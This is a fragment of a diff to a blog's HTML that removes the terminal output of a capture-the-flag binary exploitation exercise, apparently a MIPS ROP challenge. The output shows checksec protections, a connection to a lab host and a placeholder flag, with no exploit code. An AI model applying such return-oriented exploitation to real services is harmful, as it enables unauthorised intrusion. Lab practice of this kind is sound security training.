-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/utest/Code/mipsrop/write4_mipsel/write4_mipsel&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br><span class="line">[+] Opening connection to 10.0.0.2 on port 9999: Done</span><br><span class="line">b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;&#x27;</span><br><span class="line">[*] Closed connection to 10.0.0.2 port 9999</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1297,7 +1406,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-count">38</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
